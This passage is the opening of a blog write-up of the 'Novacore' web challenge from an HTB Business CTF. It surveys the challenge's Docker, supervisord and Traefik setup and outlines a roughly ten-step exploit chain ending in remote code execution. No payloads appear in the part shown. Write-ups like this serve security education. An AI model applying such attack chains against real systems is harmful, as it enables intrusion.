<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>[Web] Novacore: A Never-ending Chain (HTB Business CTF) :: elmosalamy | blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Novacore was an extremely well-designed web security challenge that appeared in Hack the Box&amp;rsquo;s Global Cyber Skills Benchmark CTF 2025 where companies like Microsoft, Cisco, Intel, Deloitte and KPMG showcased their cybersecurity talents in a one-of-a-kind business CTF." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/novacore-a-never-ending-chain/" />




<link rel="stylesheet" href="/assets/style.css">

  <link rel="stylesheet" href="/assets/green.css">



<link rel="stylesheet" href="/style.css">


<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="/img/favicon/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="[Web] Novacore: A Never-ending Chain (HTB Business CTF)">
<meta property="og:description" content="A beautiful web chain with many twists and turns with ultimate goal of RCE." />
<meta property="og:url" content="/posts/novacore-a-never-ending-chain/" />
<meta property="og:site_name" content="elmosalamy | blog" />

  <meta property="og:image" content="/images/novacore_home.png">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2025-05-28 00:00:00 &#43;0000 UTC" />












   <script id="mathjax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
<script>
  MathJax = {
    tex: {
      displayMath: [['$$', '$$']],  
      inlineMath: [['$', '$']]      
    }
  };
</script>

 
</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    elmosalamy
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a target="" href="/posts">ğŸ“ Posts</a></li>
        
      
        
          <li><a target="" href="/tags">ğŸ·ï¸ Tags</a></li>
        
      
        
          <li><a target="_blank" href="https://aelmosalamy.github.io">ğŸ”— Random stuff</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/posts">ğŸ“ Posts</a></li>
      
    
      
        <li><a href="/tags">ğŸ·ï¸ Tags</a></li>
      
    
      
        <li><a href="https://aelmosalamy.github.io">ğŸ”— Random stuff</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/posts/novacore-a-never-ending-chain/">[Web] Novacore: A Never-ending Chain (HTB Business CTF)</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2025-05-28 
      </span>
    
    
    <span class="post-author">:: aelmo</span>
    
  </div>

  
  <span class="post-tags">
    
    #<a href="/tags/ctf/">ctf</a>&nbsp;
    
    #<a href="/tags/web/">web</a>&nbsp;
    
  </span>
  

  
    <img src="/images/novacore_home.png" class="post-cover" alt="[Web] Novacore: A Never-ending Chain (HTB Business CTF)" />
  

  
    <div class="table-of-contents">
      <h2>
        
          Table of Contents
        
      </h2>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#chapter-0-just-a-normal-visitor">Chapter 0: Just a normal visitor</a></li>
    <li><a href="#chapter-1-code-structure">Chapter 1: Code structure</a>
      <ul>
        <li><a href="#web-routes-">Web Routes (<code>/</code>)</a></li>
        <li><a href="#api-routes-api">API Routes (<code>/api</code>)</a></li>
      </ul>
    </li>
    <li><a href="#chapter-2-some-bot-action">Chapter 2: Some Bot Action</a></li>
    <li><a href="#chapter-3-cracking-the-shell">Chapter 3: Cracking the Shell</a></li>
    <li><a href="#chapter-4-wreaking-havoc">Chapter 4: Wreaking Havoc</a></li>
    <li><a href="#chapter-5-everybody-gets-a-clobber">Chapter 5: Everybody Gets a Clobber!</a></li>
    <li><a href="#chapter-6-popping-calcexe-metaphorically">Chapter 6: Popping calc.exe (Metaphorically)</a></li>
    <li><a href="#chapter-7-scripting-time">Chapter 7: Scripting Time!</a></li>
    <li><a href="#finale-complete-solver--conclusion">Finale: Complete Solver + Conclusion</a></li>
  </ul>
</nav>
    </div>
  

  <div class="post-content"><div>
        <p>Novacore was an extremely well-designed web security challenge that appeared in <strong>Hack the Box&rsquo;s Global Cyber Skills Benchmark CTF 2025</strong> where companies like Microsoft, Cisco, Intel, Deloitte and KPMG showcased their cybersecurity talents in a one-of-a-kind business CTF. I competed with <a href="https://ctf.ae">CTFAE</a> securing 7th versus 750 companies.</p>
<p>I solved Novacore when it had 6 solves and it ended up being the least solved web challenge with ~20 solves by the end of the five day CTF.</p>
<p>The final chain had around 10 vulnerabilities that must be chained together to reach code execution.</p>
<p>In summary, the challenge starts with an access control bypass, followed by a buffer overflow (yes, you heard it right) in a custom keystore implementation, followed by a CSP bypass via an HTML injection to trigger three different DOM clobbering vectors that utilized a diagnostic endpoint to deliver and execute an XSS payload. From there, a file upload bypass combined with an arbitrary file write was used to place a polyglot TAR/ELF payload that we could execute to get RCE; and finally the flag.</p>
<p>This will be a beginner-friendly writeup, I will be breaking down the challenge, walking you through my mindset, before wrapping it up with a nice 0-to-flag script.</p>
<p>Let&rsquo;s dig in.</p>
<h2 id="chapter-0-just-a-normal-visitor">Chapter 0: Just a normal visitor<a href="#chapter-0-just-a-normal-visitor" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>As usual, let&rsquo;s first explore the site&rsquo;s functionality black box.</p>
<p>We start with the landing page:
<img src="/posts/novacore-a-never-ending-chain/homepage.png"></p>
<p>It seems like a website for trading stocks. It seems to support AI-driven trade. Interesting.</p>
<p>We can try to check the <strong>User Dashboard</strong>, but are stopped by a login form. Further enumeration does not give any tell-tale vulnerability signs:
<img src="/posts/novacore-a-never-ending-chain/dashboard_login.png"></p>
<p>We can not find any means to create an account. How can we register? Checking the <strong>Get an Account</strong> menu we find this:
<img src="/posts/novacore-a-never-ending-chain/get_an_account.png"></p>
<p>It seems invite only. Mmm&hellip;</p>
<p>The other <strong>About Us</strong>, <strong>Privacy Policy</strong> and <strong>For Developers</strong> links contain information and promotional material about Novacore and the features of their platform. The <strong>For Developers</strong> page hint at the existence of a Novacore developer API:
<img src="/posts/novacore-a-never-ending-chain/for_developers.png"></p>
<p>That&rsquo;s good, let&rsquo;s delve into the code.</p>
<h2 id="chapter-1-code-structure">Chapter 1: Code structure<a href="#chapter-1-code-structure" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>We are given the following tree structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span><span style="color:#f92672">$</span> tree .
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>â”œâ”€â”€ Dockerfile
</span></span><span style="display:flex;"><span>â”œâ”€â”€ build_docker.sh
</span></span><span style="display:flex;"><span>â”œâ”€â”€ challenge
</span></span><span style="display:flex;"><span>â”‚   â”œâ”€â”€ cache
</span></span><span style="display:flex;"><span>â”‚   â”‚   â”œâ”€â”€ aetherCache.c
</span></span><span style="display:flex;"><span>â”‚   â”‚   â””â”€â”€ compile.sh
</span></span><span style="display:flex;"><span>â”‚   â”œâ”€â”€ conf
</span></span><span style="display:flex;"><span>â”‚   â”‚   â”œâ”€â”€ dynamic_config.yml
</span></span><span style="display:flex;"><span>â”‚   â”‚   â”œâ”€â”€ supervisord.conf
</span></span><span style="display:flex;"><span>â”‚   â”‚   â””â”€â”€ traefik.yml
</span></span><span style="display:flex;"><span>â”‚   â”œâ”€â”€ plugins
</span></span><span style="display:flex;"><span>â”‚   â”‚   â”œâ”€â”€ alert.c
</span></span><span style="display:flex;"><span>â”‚   â”‚   â”œâ”€â”€ compile.sh
</span></span><span style="display:flex;"><span>â”‚   â”‚   â”œâ”€â”€ rrrc.c
</span></span><span style="display:flex;"><span>â”‚   â”‚   â””â”€â”€ sma.c
</span></span><span style="display:flex;"><span>â”‚   â””â”€â”€ src
</span></span><span style="display:flex;"><span>â”‚       â”œâ”€â”€ application
</span></span><span style="display:flex;"><span>â”‚       â”‚   â”œâ”€â”€ app.py
</span></span><span style="display:flex;"><span>â”‚       â”‚   â”œâ”€â”€ blueprints
</span></span><span style="display:flex;"><span>â”‚       â”‚   â”‚   â”œâ”€â”€ api.py
</span></span><span style="display:flex;"><span>â”‚       â”‚   â”‚   â””â”€â”€ web.py
</span></span><span style="display:flex;"><span>â”‚       â”‚   â”œâ”€â”€ config.py
</span></span><span style="display:flex;"><span>â”‚       â”‚   â”œâ”€â”€ datasets
</span></span><span style="display:flex;"><span>â”‚       â”‚   â”‚   â”œâ”€â”€ demo_dataset1.tar
</span></span><span style="display:flex;"><span>â”‚       â”‚   â”‚   â”œâ”€â”€ demo_dataset2.tar
</span></span><span style="display:flex;"><span>â”‚       â”‚   â”‚   â”œâ”€â”€ demo_dataset3.tar
</span></span><span style="display:flex;"><span>â”‚       â”‚   â”‚   â””â”€â”€ demo_dataset4.tar
</span></span><span style="display:flex;"><span>â”‚       â”‚   â”œâ”€â”€ plugins
</span></span><span style="display:flex;"><span>â”‚       â”‚   â”œâ”€â”€ static
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">...</span>
</span></span><span style="display:flex;"><span>â”‚       â”‚   â”œâ”€â”€ templates
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">...</span>
</span></span><span style="display:flex;"><span>â”‚       â”‚   â””â”€â”€ util
</span></span><span style="display:flex;"><span>â”‚       â”‚       â”œâ”€â”€ bot.py
</span></span><span style="display:flex;"><span>â”‚       â”‚       â”œâ”€â”€ cache.py
</span></span><span style="display:flex;"><span>â”‚       â”‚       â”œâ”€â”€ database.py
</span></span><span style="display:flex;"><span>â”‚       â”‚       â””â”€â”€ general.py
</span></span><span style="display:flex;"><span>â”‚       â”œâ”€â”€ requirements.txt
</span></span><span style="display:flex;"><span>â”‚       â””â”€â”€ run.py
</span></span><span style="display:flex;"><span>â”œâ”€â”€ entrypoint.sh
</span></span><span style="display:flex;"><span>â””â”€â”€ flag.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17</span> directories, <span style="color:#ae81ff">60</span> files
</span></span></code></pre></div><p>From the file structure, it seems like we have a <strong>&ldquo;plugins&rdquo;</strong> feature. These plugins seem to be written in C while the main app itself is written in python, specifically Flask.</p>
<p>We also notice there is a <strong>&ldquo;datasets&rdquo;</strong> feature with a couple of <code>.tar</code> files in there, perhaps the app is accepting file uploads?</p>
<p>We also notice that the <code>supervisord</code> process runner is used alongside <code>traefik</code>, a popular reverse proxy similar to <code>nginx</code>.</p>
<p>The app is dockerized, here is the <code>Dockerfile</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#75715e"># Use the official Ubuntu base image</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> ubuntu:20.04</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Set non-interactive frontend for automated installs</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENV</span> DEBIAN_FRONTEND<span style="color:#f92672">=</span>noninteractive
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disable pycache</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENV</span> PYTHONDONTWRITEBYTECODE<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Copy flag</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> flag.txt /flag.txt<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Install Traefik, Python, Supervisor, and other dependencies</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get update <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    apt-get install -y python3 python3-pip supervisor gcc curl unzip exiftool <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    curl -sSL https://github.com/traefik/traefik/releases/download/v2.10.4/traefik_v2.10.4_linux_amd64.tar.gz | tar -xz -C /usr/local/bin <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    chmod +x /usr/local/bin/traefik <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    curl -sSL https://storage.googleapis.com/chrome-for-testing-public/125.0.6422.141/linux64/chromedriver-linux64.zip -o chromedriver-linux64.zip <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    unzip chromedriver-linux64.zip -d /usr/local/bin <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    chmod +x /usr/local/bin/chromedriver-linux64/chromedriver <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    curl https://dl.google.com/linux/chrome/deb/pool/main/g/google-chrome-stable/google-chrome-stable_125.0.6422.141-1_amd64.deb -o google-chrome-stable_125.0.6422.141-1_amd64.deb <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    apt-get install -y ./google-chrome-stable_125.0.6422.141-1_amd64.deb<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Setup app</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir -p /app<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Switch working environment</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /app</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Add application</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> challenge/src .<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Install dependencies</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> pip install -r requirements.txt<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Copy custom Traefik configuration files</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> challenge/conf/traefik.yml /etc/traefik/traefik.yml<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> challenge/conf/dynamic_config.yml /etc/traefik/dynamic_config.yml<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Switch working environment</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Create cache directory</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir -p /cache<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Copy cache files</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> --chown<span style="color:#f92672">=</span>root challenge/cache/compile.sh /cache/compile.sh<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod +x /cache/compile.sh<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> challenge/cache/aetherCache.c /cache/aetherCache.c <span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> /cache/compile.sh<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Copy plugin files</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> --chown<span style="color:#f92672">=</span>root challenge/plugins /app/application/plugins<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod +x /app/application/plugins/compile.sh<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> /app/application/plugins/compile.sh<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Setup supervisor</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> challenge/conf/supervisord.conf /etc/supervisord.conf<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Expose the HTTP port</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 1337</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Copy entrypoint and make it executable</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> --chown<span style="color:#f92672">=</span>root entrypoint.sh /entrypoint.sh<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod +x /entrypoint.sh<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Run the entrypoint script</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Apart from a very typical Flask setup, the <code>Dockerfile</code> makes sure to pre-compile the C plugins we saw earlier. It also pulls specific versions of Traefik and Chrome these are <code>v2.10.4</code> and <code>125.0.6422</code> respectively.</p>
<p>While we are at it, let&rsquo;s quickly check the python <code>requirements.txt</code> for versions:</p>
<pre tabindex="0"><code>SQLAlchemy==2.0.36
Flask==3.0.3
bcrypt==4.2.0
selenium==4.25.0
requests==2.32.3
schedule==1.2.2
</code></pre><p>We always want to check versions in case they yield any quick gains from public CVEs. For now, we will note them down and continue our work.</p>
<p>Back on track, let&rsquo;s see the docker <code>entrypoint.sh</code> to understand how the app is launched:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Secure entrypoint</span>
</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> /entrypoint.sh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Random password function</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> genPass<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    echo -n $RANDOM | md5sum | head -c <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Change flag name</span>
</span></span><span style="display:flex;"><span>mv /flag.txt /flag<span style="color:#66d9ef">$(</span>cat /dev/urandom | tr -cd <span style="color:#e6db74">&#34;a-f0-9&#34;</span> | head -c 10<span style="color:#66d9ef">)</span>.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set environment variables</span>
</span></span><span style="display:flex;"><span>export ADMIN_EMAIL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>genPass<span style="color:#66d9ef">)</span><span style="color:#e6db74">@novacore.htb&#34;</span>
</span></span><span style="display:flex;"><span>export ADMIN_PASS<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>genPass<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Launch supervisord</span>
</span></span><span style="display:flex;"><span>/usr/bin/supervisord -c /etc/supervisord.conf
</span></span></code></pre></div><ol>
<li><code>flag.txt</code> is relocated to a random location, this typically means our goal is to get RCE.</li>
<li>There is an admin account with <code>ADMIN_EMAIL</code> and <code>ADMIN_PASS</code> credentials, both are random MD5 hashes.</li>
<li>The entire app is finally launched via <code>supervisord</code>.</li>
</ol>
<p>Nice, let&rsquo;s check what the <code>supervisord</code> configuration looks like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>[supervisord]
</span></span><span style="display:flex;"><span>user<span style="color:#f92672">=</span>root
</span></span><span style="display:flex;"><span>nodaemon<span style="color:#f92672">=</span>true
</span></span><span style="display:flex;"><span>logfile<span style="color:#f92672">=/</span>dev<span style="color:#f92672">/</span>null
</span></span><span style="display:flex;"><span>logfile_maxbytes<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>pidfile<span style="color:#f92672">=/</span>run<span style="color:#f92672">/</span>supervisord.pid
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[program:flask]
</span></span><span style="display:flex;"><span>command<span style="color:#f92672">=</span>python3 <span style="color:#f92672">/</span>app<span style="color:#f92672">/</span>run.py
</span></span><span style="display:flex;"><span>user<span style="color:#f92672">=</span>root
</span></span><span style="display:flex;"><span>autorestart<span style="color:#f92672">=</span>true
</span></span><span style="display:flex;"><span>stdout_logfile<span style="color:#f92672">=/</span>dev<span style="color:#f92672">/</span>stdout
</span></span><span style="display:flex;"><span>stdout_logfile_maxbytes<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>stderr_logfile<span style="color:#f92672">=/</span>dev<span style="color:#f92672">/</span>stderr
</span></span><span style="display:flex;"><span>stderr_logfile_maxbytes<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[program:traefik]
</span></span><span style="display:flex;"><span>command<span style="color:#f92672">=/</span>usr<span style="color:#f92672">/</span>local<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>traefik <span style="color:#f92672">--</span>configFile<span style="color:#f92672">=/</span>etc<span style="color:#f92672">/</span>traefik<span style="color:#f92672">/</span>traefik.yml
</span></span><span style="display:flex;"><span>user<span style="color:#f92672">=</span>root
</span></span><span style="display:flex;"><span>autostart<span style="color:#f92672">=</span>true
</span></span><span style="display:flex;"><span>autorestart<span style="color:#f92672">=</span>true
</span></span><span style="display:flex;"><span>stderr_logfile<span style="color:#f92672">=/</span>dev<span style="color:#f92672">/</span>stderr
</span></span><span style="display:flex;"><span>stderr_logfile_maxbytes<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>stdout_logfile<span style="color:#f92672">=/</span>dev<span style="color:#f92672">/</span>stdout
</span></span><span style="display:flex;"><span>stdout_logfile_maxbytes<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[program:cache]
</span></span><span style="display:flex;"><span>command<span style="color:#f92672">=/</span>cache<span style="color:#f92672">/</span>aetherCache <span style="color:#ae81ff">6379</span>
</span></span><span style="display:flex;"><span>user<span style="color:#f92672">=</span>root
</span></span><span style="display:flex;"><span>autostart<span style="color:#f92672">=</span>true
</span></span><span style="display:flex;"><span>autorestart<span style="color:#f92672">=</span>true
</span></span><span style="display:flex;"><span>stderr_logfile<span style="color:#f92672">=/</span>dev<span style="color:#f92672">/</span>stderr
</span></span><span style="display:flex;"><span>stderr_logfile_maxbytes<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>stdout_logfile<span style="color:#f92672">=/</span>dev<span style="color:#f92672">/</span>stdout
</span></span><span style="display:flex;"><span>stdout_logfile_maxbytes<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>In this app, <code>supervisord</code> is running as <code>root</code> and is controlling three different processes:</p>
<ol>
<li><code>program:flask</code>: our web server</li>
<li><code>program:traefik</code>: reverse proxy</li>
<li><code>program:cache</code>:  seems to be a custom cache server named <code>aetherCache</code>.</li>
</ol>
<p>A quick glance at <code>traefik</code>&rsquo;s configuration:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#75715e"># Entry points configuration</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">entryPoints</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">web</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">address</span>: <span style="color:#e6db74">&#34;:1337&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set up a file-based dynamic configuration provider</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">providers</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">file</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">filename</span>: <span style="color:#e6db74">&#34;/etc/traefik/dynamic_config.yml&#34;</span>
